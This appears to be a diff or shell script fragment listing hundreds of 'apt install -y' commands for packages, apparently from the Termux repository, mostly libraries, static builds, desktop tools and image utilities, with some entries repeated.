+apt install -y guile-static
+apt install -y gum
+
+apt install -y gumbo-parser-static
+
+apt install -y has
+
+apt install -y hash-slinger
+
+apt install -y heimer
+apt install -y helix
+
+apt install -y hoedown
+
+apt install -y hoedown-static
+
+apt install -y hping3
+apt install -y hr
+
+apt install -y htslib-static
+
+apt install -y httrack-static
+
+apt install -y hummin
+
+apt install -y hunspell-en-us
+
+apt install -y hunspell-hu
+
+apt install -y hunspell-static
+
+apt install -y hurrican
+
+apt install -y hydroxide
+
+apt install -y i2c-tools-static
+
+apt install -y i2pd-static
+apt install -y iamb
+apt install -y id3lib-static
+
+apt install -y imagemagick
+
+apt install -y imagemagick-static
+
+apt install -y imath
+
+apt install -y imlib2
+
+apt install -y imlib2-static
+
+apt install -y influxdb
+
+apt install -y inkscape-tutorials
+
+apt install -y inotify-tools-static
+
+apt install -y iperf3-static
+apt install -y ipfs
+apt install -y ipset-static
+
+apt install -y iptables
+
+apt install -y iptables-static
+
+apt install -y iverilog
+
+apt install -y iverilog-static
+
+apt install -y jbig2dec-static
+
+apt install -y jbig2enc-static
+
+apt install -y jcal-static
+
+apt install -y jigdo
+apt install -y jira-go
+
+apt install -y jq-static
+
+apt install -y json-c-static
+
+apt install -y jsoncpp-static
+
+apt install -y jupp
+
+apt install -y keepassxc
+
+apt install -y keybinder
+
+apt install -y keybinder-static
+
+apt install -y keyutils-static
+
+apt install -y kf6-kauth
+
+apt install -y kf6-kcodecs
+
+apt install -y kf6-kirigami
+
+apt install -y kf6-kirigami-addons
+apt install -y kibi
+
+apt install -y kitty
+
+apt install -y krabby
+
+apt install -y kubecolor
+
+apt install -y lcal
+
+apt install -y ldns
+
+apt install -y ldns-static
+
+apt install -y leptonica-static
+
+apt install -y lexbor
+
+apt install -y lftp-static
+
+apt install -y lhasa-static
+
+apt install -y liba52-static
+
+apt install -y libabw-static
+
+apt install -y libacl-static
+apt install -y libaio-static
+
+apt install -y libaml
+
+apt install -y libandroid-execinfo-static
+
+apt install -y libandroid-mathlib-static
+
+apt install -y libandroid-nl-types-static
+
+apt install -y libandroid-posix-semaphore-static
+
+apt install -y libandroid-shmem-static
+
+apt install -y libandroid-sysv-semaphore-static
+
+apt install -y libandroid-wordexp-static
+
+apt install -y libao-static
+apt install -y libaom-static
+apt install -y libarchive-static
+apt install -y libarrow-cpp
+
+apt install -y libass
+
+apt install -y libass-static
+
+apt install -y libassuan-static
+
+apt install -y libatomic-ops-static
+
+apt install -y libblosc-static
+apt install -y libbluray-static
+apt install -y libbs2b-static
+
+apt install -y libbsd-static
+
+apt install -y libburn
+
+apt install -y libburn-static
+
+apt install -y libc-client-static
+apt install -y libcaca-static
+
+apt install -y libcanberra-static
+
+apt install -y libcap-ng-static
+
+apt install -y libcap-static
+
+apt install -y libccid
+
+apt install -y libcddb-static
+
+apt install -y libcdr-static
+
+apt install -y libcln-static
+
+apt install -y libcloog-static
+
+apt install -y libcoap-static
+apt install -y libcoinor-cgl-static
+apt install -y libcoinor-osi
+
+apt install -y libcompiler-rt
+
+apt install -y libcompiler-rt-16
+apt install -y libconfig-static
+
+apt install -y libconfuse-static
+
+apt install -y libcpufeatures
+
+apt install -y libcroco-static
+
+apt install -y libcryptsetup-static
+
+apt install -y libcunit-static
+
+apt install -y libcurl-static
+
+apt install -y libcwidget-static
+
+apt install -y libczmq-static
+
+apt install -y libdaemon
+
+apt install -y libdaemon-static
+
+apt install -y libdb-static
+
+apt install -y libdbusmenu
+
+apt install -y libdbusmenu-gtk3-static
+
+apt install -y libdbusmenu-static
+
+apt install -y libde265-static
+
+apt install -y libdeflate-static
+
+apt install -y libdmtx
+
+apt install -y libdmtx-static
+
+apt install -y libduckdb-static
+apt install -y libduktape
+
+apt install -y libdvbcsa
+
+apt install -y libdvbcsa-static
+
+apt install -y libdvbpsi
+apt install -y libdvbpsi-static
+
+apt install -y libdvdnav-static
+
+apt install -y libdvdread-static
+
+apt install -y libe-book-static
+apt install -y libedit-static
+
+apt install -y libelf-static
+
+apt install -y libenet-static
+
+apt install -y libepubgen-static
+apt install -y libetonyek-static
+
+apt install -y libev-static
+
+apt install -y libevdev-static
+
+apt install -y libexif
+
+apt install -y libexif-static
+apt install -y libexpat-static
+
+apt install -y libexttextcat
+
+apt install -y libexttextcat-static
+
+apt install -y libfakekey-static
+
+apt install -y libfcft
+
+apt install -y libfdk-aac-static
+
+apt install -y libffi
+
+apt install -y libffi-static
+
+apt install -y libfixposix-static
+
+apt install -y libflac-static
+
+apt install -y libfm-extra-static
+
+apt install -y libfontenc-static
+
+apt install -y libfreehand-static
+
+apt install -y libfreexl-static
+
+apt install -y libfuse2-static
+apt install -y libgc-static
+
+apt install -y libgcrypt-static
+
+apt install -y libgee-static
+apt install -y libgf2x-static
+
+apt install -y libgfshare
+
+apt install -y libgfshare-static
+
+apt install -y libgmime-static
+
+apt install -y libgmp
+
+apt install -y libgmp-static
+apt install -y libgpg-error-static
+
+apt install -y libgsf-static
+
+apt install -y libgtksourceviewmm-3.0-static
+apt install -y libgtop
+
+apt install -y libgtop-static
+
+apt install -y libgts
+
+apt install -y libgts-static
+
+apt install -y libgxps
+
+apt install -y libhangul-static
+
+apt install -y libhdf5-static
+
+apt install -y libhtmlcxx-static
+
+apt install -y libhyphen-static
+
+apt install -y libice-static
+
+apt install -y libiconv-static
+
+apt install -y libicu-static
+
+apt install -y libidn-static
+apt install -y libidn2-static
+
+apt install -y libimagequant-static
+apt install -y libime
+
+apt install -y libimobiledevice-glue
+apt install -y libimobiledevice-glue-static
+apt install -y libimobiledevice-static
+
+apt install -y libinih
+
+apt install -y libiniparser-static
+
+apt install -y libiptcdata-static
+
+apt install -y libisl-static
+apt install -y libisoburn
+
+apt install -y libisoburn-static
+
+apt install -y libisofs
+
+apt install -y libisofs-static
+
+apt install -y libixion-static
+
+apt install -y libjansson-static
+apt install -y libjpeg-turbo
+
+apt install -y libjpeg-turbo-static
+
+apt install -y libknot
+
+apt install -y libknot-static
+
+apt install -y libkokkos
+
+apt install -y libksba-static
+
+apt install -y liblangtag-static
+
+apt install -y liblightning-static
+
+apt install -y libliquid-dsp-static
+
+apt install -y libllvm-16-static
+
+apt install -y libllvm-static
+
+apt install -y liblmdb
+
+apt install -y liblmdb-static
+
+apt install -y liblo-static
+
+apt install -y liblog4c-static
+apt install -y liblqr-static
+
+apt install -y liblrdf
+
+apt install -y liblrdf-static
+
+apt install -y libltdl
+apt install -y liblua51-static
+
+apt install -y liblua52-static
+
+apt install -y liblua53-static
+
+apt install -y liblua54-static
+
+apt install -y libluajit-static
+apt install -y liblz4
+
+apt install -y liblzma-static
+
+apt install -y liblzo-static
+
+apt install -y libmaa
+
+apt install -y libmatekbd-static
+
+apt install -y libmateweather-static
+
+apt install -y libmatio
+
+apt install -y libmaxminddb-static
+
+apt install -y libmcrypt
+
+apt install -y libmcrypt-static
+
+apt install -y libmd-static
+
+apt install -y libmediainfo-static
+
+apt install -y libmesode
+
+apt install -y libmesode-static
+apt install -y libmhash
+
+apt install -y libmhash-static
+
+apt install -y libmicrohttpd-static
+
+apt install -y libminizip-ng
+
+apt install -y libminizip-static
+
+apt install -y libmnl
+
+apt install -y libmnl-static
+
+apt install -y libmodplug-static
+
+apt install -y libmongoc
+
+apt install -y libmongoc-static
+
+apt install -y libmongocrypt
+
+apt install -y libmongocrypt-static
+
+apt install -y libmp3lame-static
+
+apt install -y libmp3splt-static
+
+apt install -y libmpc
+apt install -y libmpc-static
+apt install -y libmpeg2
+
+apt install -y libmpeg2-static
+
+apt install -y libmpfr-static
+
+apt install -y libmsgpack-static
+
+apt install -y libmspub-static
+
+apt install -y libmuparser
+
+apt install -y libmwaw-static
+
+apt install -y libmypaint-static
+
+apt install -y libnats-c-static
+
+apt install -y libncnn-static
+
+apt install -y libneon-static
+
+apt install -y libnet-static
+
+apt install -y libnetfilter-queue-static
+apt install -y libnettle-static
+
+apt install -y libnewt-static
+
+apt install -y libnfc-static
+
+apt install -y libnfnetlink-static
+
+apt install -y libnfs-static
+
+apt install -y libnftnl-static
+
+apt install -y libnghttp2-static
+
+apt install -y libnghttp3
+
+apt install -y libnghttp3-static
+
+apt install -y libnids-static
+apt install -y libnl
+
+apt install -y libnl-cli-static
+
+apt install -y libnl-static
+
+apt install -y libnova-static
+
+apt install -y libnpth-static
+
+apt install -y libnsl-static
+
+apt install -y libnspr-static
+
+apt install -y libnss
+
+apt install -y libntl-static
+
+apt install -y libnumbertext-static
+
+apt install -y libode
+
+apt install -y libodfgen-static
+
+apt install -y libogg-static
+
+apt install -y liboggz-static
+
+apt install -y libopenblas-static
+
+apt install -y libopencore-amr-static
+apt install -y libopenmpt-static
+
+apt install -y libopus-static
+apt install -y libopusenc-static
+
+apt install -y liborcus-static
+
+apt install -y libosl-static
+
+apt install -y libosmium
+
+apt install -y libotr
+apt install -y libotr-static
+
+apt install -y libpagemaker-static
+
+apt install -y libpano13-static
+
+apt install -y libpaper
+
+apt install -y libpaper-static
+
+apt install -y libpcap-static
+
+apt install -y libpciaccess-static
+
+apt install -y libpcreposix
+
+apt install -y libpcsclite-static
+
+apt install -y libpipeline-static
+
+apt install -y libplacebo
+
+apt install -y libplist-static
+
+apt install -y libpluto-static
+
+apt install -y libpng-static
+
+apt install -y libpngwriter
+
+apt install -y libpngwriter-static
+
+apt install -y libpoco
+
+apt install -y libpopt-static
+
+apt install -y libprotobuf-c-static
+
+apt install -y libpsl-static
+
+apt install -y libqxp-static
+
+apt install -y libraptor2-static
+
+apt install -y librasqal-static
+
+apt install -y librav1e-static
+
+apt install -y libraw-static
+apt install -y libretls-static
+
+apt install -y librevenge-static
+
+apt install -y librime
+
+apt install -y librinutils
+
+apt install -y librnnoise-static
+
+apt install -y librocksdb-static
+
+apt install -y librttopo-static
+apt install -y libsasl-static
+
+apt install -y libsass
+
+apt install -y libsass-static
+apt install -y libsearpc-static
+
+apt install -y libseccomp-static
+
+apt install -y libsecp256k1-static
+
+apt install -y libshout
+
+apt install -y libshout-static
+
+apt install -y libsigsegv-static
+
+apt install -y libsixel-static
+
+apt install -y libsm-static
+
+apt install -y libsndfile
+
+apt install -y libsndfile-static
+
+apt install -y libsodium
+
+apt install -y libsodium-static
+
+apt install -y libsoldout-static
+apt install -y libsophia-static
+
+apt install -y libsoundtouch-static
+apt install -y libspatialite-static
+
+apt install -y libspectre
+apt install -y libspectre-static
+
+apt install -y libspeex-static
+
+apt install -y libspice-server-static
+
+apt install -y libspnav-static
+apt install -y libsqlite-static
+
+apt install -y libssh2-static
+
+apt install -y libstaroffice-static
+
+apt install -y libstemmer
+
+apt install -y libstemmer-static
+
+apt install -y libstrophe
+
+apt install -y libstrophe-static
+
+apt install -y libt3config
+
+apt install -y libtalloc-static
+
+apt install -y libtasn1-static
+
+apt install -y libtd-static
+
+apt install -y libtdb
+apt install -y libtheora-static
+
+apt install -y libtiff
+
+apt install -y libtiff-static
+
+apt install -y libtiledb
+
+apt install -y libtirpc-static
+
+apt install -y libtllist
+
+apt install -y libtomcrypt-static
+
+apt install -y libtommath-static
+
+apt install -y libtool
+
+apt install -y libtorrent-static
+
+apt install -y libtpms-static
+
+apt install -y libtranscript
+
+apt install -y libtree-ldd
+
+apt install -y libtsduck-static
+
+apt install -y libtwolame-static
+
+apt install -y libuchardet-static
+
+apt install -y libucontext-static
+
+apt install -y libudfread-static
+
+apt install -y libunbound-static
+
+apt install -y libunistring
+
+apt install -y libunistring-static
+
+apt install -y libupscaledb
+
+apt install -y libupscaledb-static
+
+apt install -y libusb
+
+apt install -y libusb-static
+
+apt install -y libusbmuxd-static
+
+apt install -y libutf8-range
+
+apt install -y libuv-static
+
+apt install -y libv4l
+
+apt install -y libv4l-static
+
+apt install -y libvbisam-static
+
+apt install -y libvisio-static
+
+apt install -y libvmaf
+apt install -y libvmaf-static
+
+apt install -y libvncserver
+
+apt install -y libvo-amrwbenc-static
+
+apt install -y libvoikko-static
+
+apt install -y libvorbis-static
+
+apt install -y libvpx-static
+
+apt install -y libvxl
+
+apt install -y libwavpack
+
+apt install -y libwavpack-static
+
+apt install -y libwebp-static
+
+apt install -y libwpg-static
+
+apt install -y libwren
+
+apt install -y libwv-static
+
+apt install -y libx11-static
+
+apt install -y libx264-static
+
+apt install -y libx265-static
+
+apt install -y libxapian-static
+
+apt install -y libxau
+
+apt install -y libxau-static
+
+apt install -y libxaw-static
+apt install -y libxcb-static
+
+apt install -y libxcfun
+
+apt install -y libxcomposite-static
+
+apt install -y libxcursor-static
+
+apt install -y libxdamage-static
+
+apt install -y libxdg-basedir-static
+
+apt install -y libxdmcp-static
+
+apt install -y libxdrfile
+
+apt install -y libxext-static
+
+apt install -y libxfce4ui-static
+
+apt install -y libxfce4util-static
+
+apt install -y libxfixes-static
+
+apt install -y libxfont2
+
+apt install -y libxfont2-static
+
+apt install -y libxft-static
+
+apt install -y libxi-static
+
+apt install -y libxinerama-static
+
+apt install -y libxkbfile-static
+
+apt install -y libxklavier-static
+
+apt install -y libxls-static
+
+apt install -y libxlsxwriter
+
+apt install -y libxml2-python-static
+
+apt install -y libxml2-static
+
+apt install -y libxmlrpc-static
+
+apt install -y libxmu-static
+
+apt install -y libxpm-static
+
+apt install -y libxpresent-static
+
+apt install -y libxrandr-static
+
+apt install -y libxrender
+
+apt install -y libxrender-static
+
+apt install -y libxres-static
+
+apt install -y libxshmfence-static
+
+apt install -y libxss-static
+
+apt install -y libxt
+
+apt install -y libxt-static
+
+apt install -y libxtst-static
+
+apt install -y libxv-static
+
+apt install -y libxxf86dga-static
+
+apt install -y libxxf86vm-static
+apt install -y libyaml
+
+apt install -y libyaml-static
+
+apt install -y libzen-static
+
+apt install -y libzimg
+
+apt install -y libzimg-static
+
+apt install -y libzmf-static
+
+apt install -y libzmq-static
+
+apt install -y lighttpd
+apt install -y lit
+
+apt install -y lite-xl
+
+apt install -y littlecms-static
+
+apt install -y llvm-mingw-w64-libcompiler-rt
+
+apt install -y locustdb
+
+apt install -y love-static
+
+apt install -y lowdown-static
+
+apt install -y lsof-static
+
+apt install -y lua-lgi
+
+apt install -y lux
+
+apt install -y lxc-static
+
+apt install -y lychee
+
+apt install -y lz4
+apt install -y lzlib-static
+
+apt install -y mailutils-static
+
+apt install -y marco-static
+
+apt install -y mariadb
+
+apt install -y mariadb-static
+
+apt install -y marisa
+
+apt install -y marisa-static
+
+apt install -y mate-applet-brisk-menu
+apt install -y mate-common
+
+apt install -y mate-desktop-static
+
+apt install -y mate-menus-static
+
+apt install -y mate-panel-static
+
+apt install -y mate-settings-daemon-static
+apt install -y matterbridge
+
+apt install -y matterircd
+
+apt install -y mautrix-whatsapp
+
+apt install -y mbedtls-static
+apt install -y mdds
+apt install -y memcached
+
+apt install -y menu-cache-static
+
+apt install -y mercury-static
+
+apt install -y mesa-vulkan-icd-freedreno-dri3
+
+apt install -y mimetic-static
+
+apt install -y minicom
+apt install -y minisign
+
+apt install -y miniupnpc-static
+
+apt install -y minizinc-static
+
+apt install -y monero
+
+apt install -y mongodb
+
+apt install -y mono-libs
+
+apt install -y mono-static
+
+apt install -y moon-buggy
+
+apt install -y moreutils
+
+apt install -y moria
+
+apt install -y mosh-perl
+
+apt install -y mousepad-static
+
+apt install -y mpdscribble
+
+apt install -y mpg123-static
+
+apt install -y mruby-static
+
+apt install -y mtdev
+
+apt install -y mtdev-static
+apt install -y multitail
+
+apt install -y mupdf-static
+
+apt install -y music-file-organizer
+
+apt install -y nano
+
+apt install -y natpmpc-static
+
+apt install -y ncdc
+
+apt install -y ncspot
+
+apt install -y ncspot-mpris
+
+apt install -y ncurses-static
+apt install -y ncurses-ui-libs
+
+apt install -y ncurses-ui-libs-static
+apt install -y ndk-multilib
+apt install -y neofetch
+apt install -y net-snmp
+
+apt install -y net-snmp-static
+apt install -y netcat-openbsd
+
+apt install -y netcdf-c
+
+apt install -y netcdf-c-static
+
+apt install -y nfs-utils-static
+
+apt install -y nmap
+
+apt install -y nmap-ncat
+
+apt install -y nnn
+
+apt install -y nodejs
+apt install -y nodejs-12
+
+apt install -y nodejs-16
+
+apt install -y nodejs-18
+
+apt install -y nodejs-20
+
+apt install -y nodejs-lts
+
+apt install -y ntfs-3g
+
+apt install -y ntfs-3g-static
+
+apt install -y nxengine
+
+apt install -y oathtool-static
+apt install -y ocrad-static
+
+apt install -y octave
+
+apt install -y octave-static
+
+apt install -y octave-x
+
+apt install -y octave-x-static
+
+apt install -y octomap-static
+
+apt install -y ograph-rs
+
+apt install -y onefetch
+
+apt install -y onigmo-static
+
+apt install -y oniguruma-static
+
+apt install -y oorexx-static
+
+apt install -y open-adventure
+
+apt install -y openalut-static
+apt install -y openbox-static
+
+apt install -y opencl-vendor-driver
+
+apt install -y opencolorio
+
+apt install -y openfoam
+
+apt install -y openimageio
+
+apt install -y openjdk-11-x
+
+apt install -y openjdk-21-x
+
+apt install -y openldap-static
+
+apt install -y openmpi-static
+
+apt install -y openspecfun-static
+
+apt install -y openssl-1.1-static
+apt install -y openssl-static
+
+apt install -y opensubdiv
+
+apt install -y opensubdiv-static
+
+apt install -y openvdb
+
+apt install -y openvdb-static
+apt install -y openvpn
+
+apt install -y opusfile-static
+
+apt install -y osmesa
+
+apt install -y osmesa-zink
+
+apt install -y ossp-uuid-static
+apt install -y pacman-contrib
+
+apt install -y pacutils
+
+apt install -y panda3d
+
+apt install -y panda3d-static
+
+apt install -y pango
+
+apt install -y par2
+
+apt install -y pari
+
+apt install -y pari-static
+
+apt install -y parole
+
+apt install -y parole-static
+
+apt install -y parted-static
+apt install -y passphrase2pgp
+
+apt install -y pcal
+
+apt install -y pcaudiolib-static
+
+apt install -y pcre-static
+
+apt install -y pcre2-static
+
+apt install -y pdfcpu
+
+apt install -y peco
+
+apt install -y perl
+
+apt install -y phpmyadmin
+
+apt install -y pidgin-static
+
+apt install -y pika
+
+apt install -y pixz
+
+apt install -y plantuml
+
+apt install -y plotutils
+
+apt install -y plotutils-static
+
+apt install -y poke-static
+apt install -y polyml-static
+
+apt install -y pomodoro-curses
+
+apt install -y poppler
+
+apt install -y portaudio-static
+
+apt install -y posixvala
+
+apt install -y postgresql-static
+
+apt install -y potrace-static
+
+apt install -y privoxy
+
+apt install -y procps-static
+
+apt install -y profanity
+
+apt install -y proj
+
+apt install -y proot-distro
+
+apt install -y protobuf-dev
+
+apt install -y proton-bridge
+
+apt install -y ptex
+
+apt install -y ptex-static
+
+apt install -y pv
+
+apt install -y pygobject
+
+apt install -y pystring
+
+apt install -y python-brotli
+
+apt install -y python-contourpy
+
+apt install -y python-cryptography
+
+apt install -y python-kivy
+
+apt install -y python-lxml
+
+apt install -y python-msgpack
+
+apt install -y python-numpy-static
+
+apt install -y python-polars
+
+apt install -y python-pycryptodomex
+apt install -y python-scipy
+
+apt install -y python-scipy-2
+
+apt install -y python-seledroid
+apt install -y python-static
+
+apt install -y python-torch-static
+
+apt install -y python2-numpy-static
+
+apt install -y python2-scipy
+
+apt install -y qalc-static
+
+apt install -y qemu-system-aarch64
+
+apt install -y qemu-system-aarch64-headless
+
+apt install -y qemu-system-arm
+
+apt install -y qemu-system-arm-headless
+apt install -y qemu-system-i386
+apt install -y qemu-system-i386-headless
+
+apt install -y qemu-system-m68k
+apt install -y qemu-system-m68k-headless
+
+apt install -y qemu-system-ppc
+
+apt install -y qemu-system-ppc-headless
+
+apt install -y qemu-system-ppc64
+
+apt install -y qemu-system-ppc64-headless
+
+apt install -y qemu-system-riscv32
+
+apt install -y qemu-system-riscv32-headless
+
+apt install -y qemu-system-riscv64
+
+apt install -y qemu-system-riscv64-headless
+apt install -y qemu-system-x86-64
+
+apt install -y qemu-system-x86-64-headless
+
+apt install -y qemu-user-riscv32
+
+apt install -y qemu-user-riscv64
+
+apt install -y qhull-static
+
+apt install -y qpdf-static
+
+apt install -y qt5-qtscript
+
+apt install -y qt5-qtserialport
+
+apt install -y qt5-qtx11extras
+
+apt install -y qt6-qtdeclarative
+
+apt install -y qtkeychain
+apt install -y quick-lint-js
+
+apt install -y quickjs
+
+apt install -y racket-static
+
+apt install -y ragel-static
+
+apt install -y ramfs
+
+apt install -y ravencoin-static
+
+apt install -y rdiff-backup
+
+apt install -y readline-static
+
+apt install -y recode-static
+
+apt install -y recutils
+
+apt install -y recutils-static
+
+apt install -y rhash
+
+apt install -y rhash-static
+
+apt install -y rife-ncnn-vulkan
+apt install -y rife-ncnn-vulkan-is-nihui
+
+apt install -y rife-ncnn-vulkan-is-tntwise
+
+apt install -y rife-ncnn-vulkan-nihui
+apt install -y rife-ncnn-vulkan-tntwise
+
+apt install -y rig
+
+apt install -y rinetd
+
+apt install -y rip2
+
+apt install -y ripgrep
+
+apt install -y ripgrep-all
+
+apt install -y ripsecrets
+
+apt install -y rirc
+
+apt install -y ristretto
+
+apt install -y rizin
+
+apt install -y rnote
+
+apt install -y rnr
+
+apt install -y rtmpdump-static
+apt install -y rubberband-static
+apt install -y ruby-ri
+apt install -y ruby-ri-2
+apt install -y ruff
+
+apt install -y runit-static
+
+apt install -y rust-bindgen
+apt install -y rw
+apt install -y samurai
+
+apt install -y sassc
+
+apt install -y scrub
+
+apt install -y sdl-image
+apt install -y sdl-image-static
+
+apt install -y sdl-mixer-static
+
+apt install -y sdl-net-static
+apt install -y sdl-ttf-static
+
+apt install -y sdl2-gfx
+
+apt install -y sdl2-gfx-static
+
+apt install -y sdl2-image
+
+apt install -y sdl2-image-static
+
+apt install -y sdl2-mixer-static
+
+apt install -y sdl2-net-static
+
+apt install -y sdl2-pango
+apt install -y sdl2-pango-static
+
+apt install -y sdl2-static
+
+apt install -y sdl2-ttf-static
+
+apt install -y seafile-client
+
+apt install -y seafile-client-static
+
+apt install -y sed
+apt install -y seledroid-app
+
+apt install -y sendxmpp
+
+apt install -y sensible-utils
+
+apt install -y serf-static
+
+apt install -y sfeed
+
+apt install -y sfml
+apt install -y shaderc
+
+apt install -y shc
+
+apt install -y shiori
+
+apt install -y shtool
+apt install -y signify
+apt install -y sl
+
+apt install -y slashtime
+
+apt install -y sleuthkit-static
+apt install -y slugify
+
+apt install -y smalltalk-static
+apt install -y smartdns
+apt install -y soju
+apt install -y solidity
+apt install -y sord
+apt install -y sox
+apt install -y sox-static
+
+apt install -y speexdsp-static
+apt install -y spglib
+
+apt install -y spiped
+apt install -y sqlcipher-static
+
+apt install -y squashfs-tools-ng-static
+apt install -y squashfuse-static
+apt install -y sratom
+
+apt install -y ssdeep
+
+apt install -y ssdeep-static
+
+apt install -y sse2neon
+
+apt install -y ssss
+
+apt install -y startup-notification
+
+apt install -y startup-notification-static
+apt install -y stfl-static
+
+apt install -y stoken-static
+apt install -y streamripper
+apt install -y sttr
+
+apt install -y stunnel-static
+apt install -y subtitleripper
+apt install -y subversion
+
+apt install -y subversion-perl-static
+apt install -y subversion-static
+
+apt install -y suitesparse
+apt install -y suitesparse-static
+
+apt install -y sundials-static
+apt install -y supertuxkart
+apt install -y surreal
+
+apt install -y svgbob
+apt install -y swig
+
+apt install -y swtpm-static
+
+apt install -y tabbed
+apt install -y tagparser
+
+apt install -y tasksh
+
+apt install -y taskwarrior
+apt install -y tcplay-veracrypt-static
+
+apt install -y tdl
+apt install -y teckit-static
+
+apt install -y telepathy-glib-static
+apt install -y tere
+apt install -y termux-api-static
+
+apt install -y termux-apt-repo
+
+apt install -y termux-gui-pm
+
+apt install -y termux-keyring
+
+apt install -y texinfo
+
+apt install -y texlab
+apt install -y texlive-bin
+
+apt install -y texlive-bin-static
+
+apt install -y texlive-installer
+apt install -y texworks
+apt install -y thrift
+apt install -y thunar-archive-plugin-static
+apt install -y thunar-static
+apt install -y tidy-static
+apt install -y time
+apt install -y timewarrior
+
+apt install -y tinyemu
+apt install -y tinyfugue
+apt install -y tmate
+apt install -y torsocks
+apt install -y torsocks-static
+apt install -y tree-sitter-c-static
+apt install -y tree-sitter-lua-static
+
+apt install -y tree-sitter-markdown-static
+apt install -y tree-sitter-query-static
+
+apt install -y tree-sitter-static
+
+apt install -y tree-sitter-vim
+
+apt install -y tree-sitter-vim-static
+
+apt install -y tree-sitter-vimdoc-static
+apt install -y trigger-rally
+
+apt install -y trojan-go
+
+apt install -y ttyd
+
+apt install -y tumbler
+apt install -y tumbler-static
+apt install -y turbo-text-editor
+apt install -y turbo-text-editor-static
+apt install -y udftools
+apt install -y uget
+apt install -y ugrep
+apt install -y unicorn-static
+apt install -y units-cur
+apt install -y urdfdom
+
+apt install -y utf8proc-static
+apt install -y util-linux-static
+
+apt install -y uutils-coreutils
+apt install -y uv
+
+apt install -y v2ray
+apt install -y valac-static
+apt install -y valadoc-static
+apt install -y vamp-plugin-sdk-static
+
+apt install -y vde2
+apt install -y vde2-static
+
+apt install -y vera
+apt install -y vgmstream
+apt install -y virglrenderer-android
+
+apt install -y vitetris
+apt install -y vivid
+
+apt install -y vtm
+
+apt install -y vulkan-loader-generic
+apt install -y vulkan-utility-libraries
+apt install -y wavemon
+apt install -y wcslib-static
+apt install -y webkit2gtk-4.1
+apt install -y webkit2gtk-driver
+apt install -y webkitgtk-6.0
+
+apt install -y weechat-matrix-rs
+apt install -y wget
+apt install -y wget2-static
+
+apt install -y wgetpaste
+apt install -y whiptail
+apt install -y wireless-tools-static
+apt install -y wiz
+apt install -y wmaker-static
+apt install -y wordgrinder
+apt install -y wren
+apt install -y wxwidgets
+
+apt install -y xarchiver
+apt install -y xcb-proto
+apt install -y xcb-util
+apt install -y xcb-util-cursor-static
+
+apt install -y xcb-util-image
+apt install -y xcb-util-image-static
+apt install -y xcb-util-keysyms
+apt install -y xcb-util-keysyms-static
+
+apt install -y xcb-util-renderutil
+apt install -y xcb-util-renderutil-static
+apt install -y xcb-util-static
+apt install -y xcb-util-wm
+apt install -y xcb-util-wm-static
+
+apt install -y xcb-util-xrm-static
+
+apt install -y xdg-utils
+
+apt install -y xf86-input-void
+apt install -y xf86-video-dummy
+
+apt install -y xfce4-battery-plugin-static
+
+apt install -y xfce4-calculator-plugin-static
+
+apt install -y xfce4-clipman-plugin-static
+apt install -y xfce4-cpugraph-plugin-static
+apt install -y xfce4-datetime-plugin-static
+
+apt install -y xfce4-dict-static
+apt install -y xfce4-docklike-plugin-static
+apt install -y xfce4-eyes-plugin-static
+
+apt install -y xfce4-genmon-plugin
+
+apt install -y xfce4-genmon-plugin-static
+
+apt install -y xfce4-goodies
+
+apt install -y xfce4-mailwatch-plugin-static
+apt install -y xfce4-netload-plugin-static
+
+apt install -y xfce4-notes-plugin-static
+apt install -y xfce4-notifyd-static
+
+apt install -y xfce4-panel-static
+apt install -y xfce4-places-plugin
+
+apt install -y xfce4-places-plugin-static
+
+apt install -y xfce4-pulseaudio-plugin-static
+apt install -y xfce4-screenshooter-static
+apt install -y xfce4-timer-plugin-static
+
+apt install -y xfce4-wavelan-plugin-static
+
+apt install -y xfconf-static
+apt install -y xfdashboard-static
+
+apt install -y xh
+apt install -y xmlsec
+apt install -y xmlsec-static
+apt install -y xorg-iceauth
+
+apt install -y xorg-xauth
+
+apt install -y xorg-xev
+
+apt install -y xorg-xkbcomp
+
+apt install -y xorg-xprop
+
+apt install -y xorg-xrandr
+
+apt install -y xorg-xwininfo
+
+apt install -y xorriso
+apt install -y xrdp-static
+apt install -y xvidcore-static
+apt install -y xxhash
+
+apt install -y xxhash-static
+
+apt install -y yajl-static
+apt install -y yara-static
+
+apt install -y yasm-static
+
+apt install -y yazi
+
+apt install -y ytfzf
+apt install -y yuma123-static
+apt install -y zaz
+
+apt install -y zbar
+
+apt install -y zbar-static
+
+apt install -y zellij
+
+apt install -y zenity
+apt install -y zipios
+
+apt install -y zlib-static
+apt install -y zpaq
+
+apt install -y zrok
+apt install -y zssh
+apt install -y zziplib
+
+apt install -y zzuf-static
+
+apt install -y chocolate-doom
+apt install -y deutex
+
+apt install -y rife-ncnn-vulkan
+
+apt install -y rife-ncnn-vulkan-is-nihui
+apt install -y rife-ncnn-vulkan-is-tntwise
+
+apt install -y rife-ncnn-vulkan-nihui
+
+apt install -y rife-ncnn-vulkan-tntwise
+
+apt install -y abootimg
+apt install -y astrometry.net
+apt install -y aview
+apt install -y bdsup2sub
+
+apt install -y catimg
+apt install -y cavif-rs
+
+apt install -y cfitsio
+
+apt install -y chafa
+
+apt install -y dcraw
+
+apt install -y enblend
+
+apt install -y eog
+apt install -y feh
+
+apt install -y freeimage
+
+apt install -y freeimage-static
+
+apt install -y gdk-pixbuf
+
+apt install -y gegl
+
+apt install -y genext2fs
+
+apt install -y germanium
+apt install -y giflib
+
+apt install -y gifsicle
+
+apt install -y gifski
+
+apt install -y gimp
+apt install -y gmic
+
+apt install -y gmic-gm
+
+apt install -y go-findimagedupes
+
+apt install -y graphicsmagick
+
+apt install -y hfsutils
+
+apt install -y hugin
+apt install -y icoutils
+
+apt install -y imagemagick
+
+apt install -y imagemagick-static
+apt install -y imgflo
+apt install -y imlib2
+
+apt install -y jbig2dec
+apt install -y jigdo
+
+apt install -y jpegoptim
+
+apt install -y leptonica
+
+apt install -y libdevil
+
+apt install -y libexif
+
+apt install -y libgd
+
+apt install -y libgeotiff
+
+apt install -y libheif
+
+apt install -y libheif-progs
+
+apt install -y libimagequant
+
+apt install -y libimagequant-static
+
+apt install -y libisofs
+
+apt install -y libjpeg-turbo
+
+apt install -y libjxl
+
+apt install -y liblqr
+
+apt install -y libplacebo
+
+apt install -y libpngwriter
+
+apt install -y libtiff
+
+apt install -y libvips
+
+apt install -y libvxl
+
+apt install -y libwebp
+
+apt install -y libwpg
+
+apt install -y libzxing-cpp
+
+apt install -y lximage-qt
+
+apt install -y mtools
+
+apt install -y netpbm
+
+apt install -y openimageio
+
+apt install -y openjpeg
+
+apt install -y openslide
+
+apt install -y optipng
+
+apt install -y pngquant
+
+apt install -y potrace
+
